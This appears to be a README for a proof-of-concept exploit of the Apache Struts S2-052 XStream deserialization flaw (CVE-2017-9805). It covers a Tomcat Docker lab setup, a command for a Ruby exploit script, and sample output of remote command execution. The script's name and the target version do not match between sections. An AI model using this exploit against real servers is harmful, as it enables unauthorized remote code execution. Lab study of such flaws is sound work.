# CVE-2017-9805 | Apache Struts REST plug-in XML processing (Struts2 S2-052) RCE

The REST Plugin is using a XStreamHandler with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.


Vulnerable Versions
- 2.1.2 - 2.3.33
- 2.5 - 2.5.12

# Usage
1. install tomcat
2. deploy `struts2-rest-showcase-2.5.12.war` file

If you don't want to install tomcat, on your system, you can use docker image

```
# Download and Run tomcat docker image
$ docker run -it --rm -p 8080:8080 tomcat:8.0 bash

# update and install nano
$ apt update
$ apt install nano

# Edit /usr/local/tomcat/conf/tomcat-users.xml
$ nano /usr/local/tomcat/conf/tomcat-users.xml

# To have the following lines between <tomcat-users> </tomcat-users>
<role rolename="admin-gui"/>
<user username="tomcat" password="secret" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-script,admin-gui"/>

# Save, then start the tomcat service
$ /usr/local/tomcat/bin/startup.sh
```

Browse (http://172.17.0.2:8080/manager/html)


**Exploit**

```
ruby cve-2017-5638_exploit.rb <TARGET URL> ["CMD"]
```

## PoC
Here your write the result of executing the exploit on your target

```
-> ruby cve-2017-9805_exploit.rb http://172.17.0.2:8080/struts2_2.3.15.1-showcase/showcase.action "ls -la"
[*] CVE: 2017-9805 - Apache Struts2 S2-052
[*] CMD: ls -la
[+] Target Exploited!
```

# References
- http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9805
- http://struts.apache.org/docs/s2-052.html
- https://github.com/nixawk/labs/tree/master/CVE-2017-5638
- https://samsclass.info/124/proj14/p10xstruts.htm
- https://nti.nsfocusglobal.com/threatnewscategories/struts-2-s2-052-rest-plug-in-remote-code-execution-vulnerability-analysis/
- https://mvnrepository.com/artifact/org.apache.struts/struts2-rest-showcase/2.5.12

